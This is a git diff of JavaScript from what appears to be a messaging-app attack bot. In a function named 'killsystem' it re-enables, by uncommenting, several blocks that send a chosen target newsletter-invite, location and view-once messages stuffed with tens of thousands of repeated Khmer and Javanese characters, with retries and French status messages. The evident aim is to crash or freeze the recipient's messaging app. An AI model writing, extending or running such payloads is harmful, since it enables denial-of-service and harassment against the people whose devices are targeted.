@@ -275,7 +275,7 @@ export default {
       async function killsystem(trim, target) {
         if (!trim || !target) return;
 
-        /*const uw = "ោ៝".repeat(10000);
+        const uw = "ោ៝".repeat(10000);
         const uz = "ꦾ".repeat(10000);
         const up = {
           newsletterAdminInviteMessage: {
@@ -307,9 +307,9 @@ export default {
             : actionError;
           context.onStatus?.(`Ligne1 ⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
         }
-        await new Promise(resolve => setTimeout(resolve, 800));*/
+        await new Promise(resolve => setTimeout(resolve, 800));
 
-       /* const uw2 = "ꦾ".repeat(61111);
+       const uw2 = "ꦾ".repeat(61111);
         try {
           await trim.relayMessage(target, {
             locationMessage: {
@@ -374,8 +374,8 @@ export default {
           context.onStatus?.(`Ligne 2⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
         }
         await new Promise(resolve => setTimeout(resolve, 1200));
-*/
-/*        try {
+
+        try {
           await trim.relayMessage(target, {
             viewOnceMessage: {
               message: {
@@ -426,7 +426,7 @@ export default {
           context.onStatus?.(`Ligne 3⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
         }
         await new Promise(resolve => setTimeout(resolve, 600));
-*/
+
         try {
           await trim.relayMessage(target, {
             viewOnceMessage: {
